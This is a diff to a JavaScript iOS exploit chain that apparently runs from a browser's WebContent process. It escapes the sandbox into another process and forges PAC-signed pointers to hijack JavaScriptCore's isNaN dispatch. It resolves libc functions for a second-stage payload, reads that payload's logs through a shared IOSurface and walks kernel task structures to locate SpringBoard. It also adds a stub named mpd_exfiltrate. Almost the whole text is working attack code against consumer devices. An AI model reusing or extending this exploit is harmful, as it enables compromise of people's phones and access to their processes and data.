@@ -3,6 +3,8 @@
   const peCode = "&v={{LPE_64BITE}}";
   let wc_fcall = fcall;
   let wc_uread64 = read64;
+  // Kernel r/w functions are global (from header.js via bundle.js)
+  // Access them directly from global scope
   let uread64 = gpuRead64;
   let uwrite64 = gpuWrite64;
   let pacia = gpuPacia;
@@ -6899,17 +6901,47 @@
     LOG("[MPD] Getting rw_array and control_array...");
     let rw_array_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "rw_array") + 0x8n);
     let control_array_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "control_array") + 0x8n);
+    LOG(`[MPD] rw_array_addr: ${rw_array_addr.hex()} control_array_addr: ${control_array_addr.hex()}`);
     mpd_write64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
     let rw_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "rw_array_8") + 0x8n);
     let control_array_8_addr = mpd_read64(mpd_objectForKeyedSubscript(ctx, "control_array_8") + 0x8n);
+    LOG(`[MPD] rw_array_8_addr: ${rw_array_8_addr.hex()} control_array_8_addr: ${control_array_8_addr.hex()}`);
     mpd_write64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
-    let signing_ctx = 0n;
-    // Use mpd_pacia (A key) for code pointer
-    // Context 0 matches what JSContext expects for executable code pointers
+    // Diagnostic: dump 0x80 bytes around isnan_executable_addr
+    LOG("[MPD] === DUMP isnan_executable ===");
+    let dump_base = isnan_executable_addr;
+    for (let di = 0n; di < 0x80n; di += 0x10n) {
+      let line = `[MPD]   +${di.hex(4)}: `;
+      for (let dj = 0n; dj < 0x10n; dj += 0x8n) {
+        line += mpd_read64(dump_base + di + dj).hex() + " ";
+      }
+      LOG(line);
+    }
+    LOG("[MPD] === END DUMP ===");
+    let orig_at_28 = mpd_read64(isnan_code_ptr);
+    LOG(`[MPD] orig value at +0x28 (code_ptr): ${orig_at_28.hex()}`);
+    let orig_at_20 = mpd_read64(isnan_executable_addr + 0x20n);
+    LOG(`[MPD] orig value at +0x20: ${orig_at_20.hex()}`);
+    let orig_at_30 = mpd_read64(isnan_executable_addr + 0x30n);
+    LOG(`[MPD] orig value at +0x30: ${orig_at_30.hex()}`);
+    // Try address-diverse signing: use isnan_code_ptr as context
+    // JSC may use the pointer storage address as PAC context
+    let signing_ctx = isnan_code_ptr;
+    LOG(`[MPD] using signing_ctx = isnan_code_ptr = ${signing_ctx.hex()}`);
     let signed_fcall_addr = mpd_pacia(jsvm_isNAN_fcall_gadget, signing_ctx);
     LOG(`[MPD] signed_fcall_addr: ${signed_fcall_addr.hex()}`);
     LOG(`[MPD] isnan_code_ptr: ${isnan_code_ptr.hex()}`);
     mpd_write64(isnan_code_ptr, signed_fcall_addr);
+    // Read back to verify
+    let verify_val = mpd_read64(isnan_code_ptr);
+    LOG(`[MPD] verify after write: ${verify_val.hex()} (matches=${verify_val === signed_fcall_addr})`);
+    // Also overwrite +0x20 code pointer (may be the actual dispatch entry)
+    let isnan_code_ptr_20 = isnan_executable_addr + 0x20n;
+    let signed_fcall_20 = mpd_pacia(jsvm_isNAN_fcall_gadget, isnan_code_ptr_20);
+    LOG(`[MPD] overwriting +0x20 (${isnan_code_ptr_20.hex()}) with ${signed_fcall_20.hex()}`);
+    mpd_write64(isnan_code_ptr_20, signed_fcall_20);
+    let verify_20 = mpd_read64(isnan_code_ptr_20);
+    LOG(`[MPD] verify +0x20 after write: ${verify_20.hex()} (matches=${verify_20 === signed_fcall_20})`);
     LOG(`[MPD] ctx: ${ctx.hex()}`);
     LOG(`[MPD] Checking unboxed_arr before func_offsets_array`);
     let unboxed_check = mpd_objectForKeyedSubscript(ctx, "unboxed_arr");
@@ -6976,10 +7008,120 @@
     LOG(`xpac_gadget:${xpac_gadget.hex()}`);
     mpd_write64(new_func_offsets_buffer + idx * 0x8n, xpac_gadget);
     idx += 0x1n;
-    // Use synchronous evaluation to ensure PE executes before worker exits
-    LOG("[MPD] Evaluating pe_main synchronously...");
-    mpd_evaluateScript(ctx, pe_main_cfstring);
-    LOG("[MPD] pe_main evaluated (sync)");
+    // Pre-resolve function pointers for PE using gpuDlsym (avoids PE's dlsym hang)
+    // [14] = getpid - simple test to confirm fcall mechanism works
+    let getpid_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "getpid").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(getpid_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [15] = malloc
+    let malloc_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "malloc").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(malloc_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [16] = free
+    let free_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "free").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(free_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [17] = memset
+    let memset_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "memset").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(memset_raw, 0xc2d0n));
+    idx += 0x1n;
+    // [18] = memcpy
+    let memcpy_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "memcpy").noPAC();
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, mpd_pacia(memcpy_raw, 0xc2d0n));
+    idx += 0x1n;
+    LOG(`[MPD] Pre-resolved 5 function pointers for PE (indices 14-18)`);
+    // [19] = surface_address_remote (for PE to write logs to IOSurface directly)
+    mpd_write64(new_func_offsets_buffer + idx * 0x8n, surface_address_remote);
+    idx += 0x1n;
+    LOG(`[MPD] surface_remote at func_offsets[19] = ${surface_address_remote.hex()}`);
+    // [20] = reserved for proc_listpids (dlsym may crash, skip for now)
+    // Debug: verify func_offsets_buffer contents before PE
+    LOG("[MPD] func_offsets_buffer contents:");
+    for (let i = 0n; i < 5n; i++) {
+      let val = mpd_read64(new_func_offsets_buffer + i * 8n);
+      LOG(`[MPD]   [${i}] = ${val.hex()}`);
+    }
+    // Diagnostic: verify local IOSurface read/write with uwrite8/uread8 (same addr space)
+    let _diag = surface_address + 0xF000n;
+    uwrite8(_diag,      0xEFn);
+    uwrite8(_diag + 1n, 0xBEn);
+    uwrite8(_diag + 2n, 0xADn);
+    uwrite8(_diag + 3n, 0xDEn);
+    let _v0 = uread8(_diag);
+    let _v1 = uread8(_diag + 1n);
+    let _v2 = uread8(_diag + 2n);
+    let _v3 = uread8(_diag + 3n);
+    LOG(`[MPD] IOSURF diag: wrote EFBEADDE read ${_v0} ${_v1} ${_v2} ${_v3}`);
+
+    // Pre-call getpid via mpd_fcall and store result in IOSurface for PE
+    // This bypasses the broken JOP chain entirely
+    let pid_via_mpd = mpd_fcall(getpid_raw, 0n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
+    LOG(`[MPD] getpid via mpd_fcall: ${pid_via_mpd}`);
+    // Store at surface + 0xF830 (rpc_result area)
+    let rpc_result_addr = surface_address + 0xF830n;
+    let rpc_status_addr = surface_address + 0xF828n;
+    uwrite64(rpc_result_addr, pid_via_mpd);
+    // Set status=2 (done) so PE knows the value is ready
+    uwrite64(rpc_status_addr, 2n);
+    // Also clear any stray RPC cmd
+    let rpc_cmd_addr = surface_address + 0xF800n;
+    uwrite64(rpc_cmd_addr, 0n);
+    LOG(`[MPD] Wrote pid=${pid_via_mpd} to IOSurface at ${rpc_result_addr.hex()}`);
+
+    // Resolve proc_listpids via gpuDlsym (WebContent side), then call in MPD
+    let plist_buf = 0n;
+    let plist_count = 0n;
+    let proc_listpids_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "proc_listpids");
+    LOG(`[MPD] gpuDlsym(proc_listpids) = ${proc_listpids_raw.hex()}`);
+    if (proc_listpids_raw != 0n) {
+      let buf_sz = 0x10000n;
+      plist_buf = mpd_malloc(buf_sz);
+      // Call proc_listpids in MPD context via mpd_fcall
+      plist_count = mpd_fcall(proc_listpids_raw.noPAC(), 1n, 0n, plist_buf, buf_sz, 0n, 0n, 0n, 0n);
+      LOG(`[MPD] proc_listpids via mpd_fcall: ${plist_count}`);
+    } else {
+      LOG("[MPD] proc_listpids gpuDlsym returned NULL");
+    }
+    uwrite64(surface_address + 0xF838n, plist_buf);
+    uwrite64(surface_address + 0xF840n, plist_count);
+    if (plist_count != 0n) {
+      LOG(`[MPD] Stored plist_buf=${plist_buf.hex()} count=${plist_count} in IOSurface`);
+    }
+
+    // Use nowait evaluate + IOSurface log polling (bypasses mpd_fcall issues)
+    LOG("[MPD] Evaluating pe_main (nowait)...");
+    mpd_evaluateScript_nowait(ctx, pe_main_cfstring);
+    LOG("[MPD] pe_main dispatched, polling IOSurface log area...");
+    let s_log_base = surface_address + 0xF000n;
+    let s_off_addr = s_log_base + 0xE00n;
+    let s_log = "";
+    let total_wait = 0;
+    while (total_wait < 5000) {
+      // First read write offset from IOSurface (8 bytes, little-endian)
+      let b0 = uread8(s_off_addr);
+      let b1 = uread8(s_off_addr + 1n);
+      let b2 = uread8(s_off_addr + 2n);
+      let b3 = uread8(s_off_addr + 3n);
+      let b4 = uread8(s_off_addr + 4n);
+      let b5 = uread8(s_off_addr + 5n);
+      let b6 = uread8(s_off_addr + 6n);
+      let b7 = uread8(s_off_addr + 7n);
+      let log_off = BigInt(b0) | (BigInt(b1) << 8n) | (BigInt(b2) << 16n) | (BigInt(b3) << 24n)
+                  | (BigInt(b4) << 32n) | (BigInt(b5) << 40n) | (BigInt(b6) << 48n) | (BigInt(b7) << 56n);
+      if (log_off > 0n && log_off < 0xE00n) {
+        s_log = "";
+        for (let i = 0n; i < log_off; i++) {
+          let ch = uread8(s_log_base + i);
+          if (ch === 0n) break;
+          s_log += String.fromCharCode(Number(ch));
+        }
+        LOG(`[MPD] IOSURF PE LOG (${log_off}b): ${s_log}`);
+        if (s_log.indexOf("DONE") >= 0 || s_log.indexOf("getpid()=") >= 0) break;
+      }
+      gpu_fcall(USLEEP, 200000n);
+      total_wait += 200;
+    }
+    if (!s_log) LOG("[MPD] IOSURF PE log: empty after timeout");
 
     // Read PE logs from shared buffer
     LOG("[MPD] Reading PE logs from buffer...");
@@ -6987,10 +7129,10 @@
     LOG(`[MPD] PE log offset: ${pe_log_offset}`);
     if (pe_log_offset > 0n) {
       let pe_log_text = "";
-      let max_read = pe_log_offset < 1000n ? pe_log_offset : 1000n;
+      let max_read = pe_log_offset < 4000n ? pe_log_offset : 4000n;
       for (let i = 0n; i < max_read; i++) {
         let ch = mpd_read8(pe_log_buf + i);
-        if (ch === 0) break;
+        if (ch === 0) { pe_log_text += "\\0"; continue; }
         pe_log_text += String.fromCharCode(Number(ch));
       }
       LOG(`[MPD] PE LOG: ${pe_log_text}`);
@@ -6999,6 +7141,108 @@
     }
     // Note: PE logs cannot be read after nowait_exit because MPD fcall mechanism
     // may be affected. PE runs independently in MPD process.
+  }
+  function mpd_exfiltrate() {
+    LOG("[MPD-EXFIL] SKIPPED (MPD has no network/file access)");
+  }
+  function ktask_find_by_name(name) {
+    // Parse PE log buffer for [KTASK_RESULT] lines written by pe_main_minimal.js
+    LOG("[KTASK] Reading PE log buffer for ktask results...");
+    let pe_log_offset = mpd_read64(pe_log_buf_off);
+    if (pe_log_offset === 0n) {
+      LOG("[KTASK] PE log buffer is empty, trying fallback kernel r/w...");
+      return ktask_find_by_name_fallback(name);
+    }
+    let pe_log_text = "";
+    let max_read = pe_log_offset < 4000n ? pe_log_offset : 4000n;
+    for (let i = 0n; i < max_read; i++) {
+      let ch = mpd_read8(pe_log_buf + i);
+      if (ch === 0) break;
+      pe_log_text += String.fromCharCode(Number(ch));
+    }
+    // Parse [KTASK_RESULT] <name>=<hex> pid=<int>
+    let result_prefix = "[KTASK_RESULT] " + name + "=";
+    let idx = pe_log_text.indexOf(result_prefix);
+    if (idx === -1) {
+      LOG("[KTASK] No ktask result in PE log, trying fallback...");
+      return ktask_find_by_name_fallback(name);
+    }
+    let hex_start = idx + result_prefix.length;
+    let hex_end = pe_log_text.indexOf(" ", hex_start);
+    if (hex_end === -1) hex_end = pe_log_text.indexOf("\n", hex_start);
+    if (hex_end === -1) hex_end = pe_log_text.length;
+    let hex_str = pe_log_text.substring(hex_start, hex_end);
+    let task_addr = BigInt(hex_str);
+    LOG("[KTASK] Parsed " + name + " task=" + task_addr.hex() + " from PE log");
+    // Also parse pid if present
+    let pid_idx = pe_log_text.indexOf("pid=", hex_end);
+    if (pid_idx !== -1 && task_addr === 0n) {
+      let pid_str = pe_log_text.substring(pid_idx + 4);
+      let pid_end = pid_str.indexOf("\n");
+      if (pid_end !== -1) pid_str = pid_str.substring(0, pid_end);
+      LOG("[KTASK] SpringBoard PID from PE: " + pid_str);
+    }
+    return task_addr;
+  }
+  function ktask_find_by_name_fallback(name) {
+    // Fallback: try to use global mpd_kread64/mpd_kernel_base (from bundle.js header)
+    let _kread64 = null;
+    if (typeof mpd_kread64 !== 'undefined') { _kread64 = mpd_kread64; LOG("[KTASK] using mpd_kread64"); }
+    else if (typeof early_kread64 !== 'undefined') { _kread64 = early_kread64; LOG("[KTASK] using early_kread64"); }
+    else { LOG("[KTASK] no kernel read function available"); return 0n; }
+    let _kbase = null;
+    if (typeof mpd_kernel_base !== 'undefined') { _kbase = mpd_kernel_base; }
+    else if (typeof kernel_base !== 'undefined' && kernel_base !== 0n) { _kbase = function() { return kernel_base; }; }
+    else { LOG("[KTASK] no kernel_base function available"); return 0n; }
+    let our_pid = gpu_fcall(func_resolve("getpid"));
+    LOG("[KTASK] our pid=" + our_pid);
+    let OFF_KERNEL_TASK = 0xb23d28n;
+    let OFF_NEXT_TASK = 0x30n;
+    let OFF_PROC_RO = 0x3e0n;
+    let OFF_PID = 0x60n;
+    let OFF_PCOMM = 0x56cn;
+    let kernel_task_ptr = _kbase() + OFF_KERNEL_TASK;
+    LOG("[KTASK] kernel_base=" + _kbase().hex());
+    let kernel_task = _kread64(kernel_task_ptr);
+    LOG("[KTASK] kernel_task=" + kernel_task.hex());
+    let curr = _kread64(kernel_task + OFF_NEXT_TASK);
+    let found = 0n;
+    let iterations = 0;
+    while (curr !== 0n && curr !== kernel_task && iterations < 500) {
+      iterations++;
+      let proc_ro_ptr = _kread64(curr + OFF_PROC_RO);
+      let proc = _kread64(proc_ro_ptr);
+      if (proc > 0xffffffd000000000n) {
+        let pid_buf = calloc(1n, 8n);
+        if (typeof mpd_kread_length !== 'undefined') { mpd_kread_length(proc + OFF_PID, pid_buf, 4n); }
+        else { kread_length(proc + OFF_PID, pid_buf, 4n); }
+        let pid = Number(uread32(pid_buf));
+        gpu_fcall(func_resolve("free"), pid_buf);
+        let comm_buf = calloc(1n, 20n);
+        if (typeof mpd_kread_length !== 'undefined') { mpd_kread_length(proc + OFF_PCOMM, comm_buf, 17n); }
+        else { kread_length(proc + OFF_PCOMM, comm_buf, 17n); }
+        let comm = "";
+        for (let i = 0n; i < 17n; i++) {
+          let ch = uread8(comm_buf + i);
+          if (ch === 0) break;
+          comm += String.fromCharCode(Number(ch));
+        }
+        gpu_fcall(func_resolve("free"), comm_buf);
+        if (pid === Number(our_pid)) {
+          LOG("[KTASK] found self task=" + curr.hex() + " pid=" + pid);
+        }
+        if (comm === name) {
+          LOG("[KTASK] FOUND " + name + " task=" + curr.hex() + " pid=" + pid);
+          found = curr;
+          break;
+        }
+      }
+      curr = _kread64(curr + OFF_NEXT_TASK);
+    }
+    if (!found) {
+      LOG("[KTASK] " + name + " not found after " + iterations + " iterations");
+    }
+    return found;
   }
   sbx1sbx1_interval = Date.now();
   let sbx1sbx1_succeeded = sbx1sbx1();
@@ -7011,6 +7255,10 @@
   }
   if (sbx1sbx1_succeeded) {
     spawn_pe();
+    mpd_exfiltrate();
+    // M2: Test kernel task traversal
+    let sb_task = ktask_find_by_name("SpringBoard");
+    LOG("[M2] SpringBoard task = " + sb_task.hex());
   }
   LOG("closing remaker_connection: " + remaker_connection);
   LOG("Before xpc_connection_cancel");
@@ -7026,10 +7274,7 @@
   uwrite64(offsets.emptyString + 0x78n, 0n);
   uwrite64(offsets.emptyString + 0x80n, 0x1200000001n);
   LOG("bmalloc metadata restored");
-  // PE logs were already read before XPC close
   LOG("ALL DONE!");
-  // Exit directly instead of returning to sbx0 to avoid crash during eval() return
   LOG("Calling _exit() from sbx1");
   wc_fcall(offsets.exit, 0n);
-  //exit(0n);
 })();
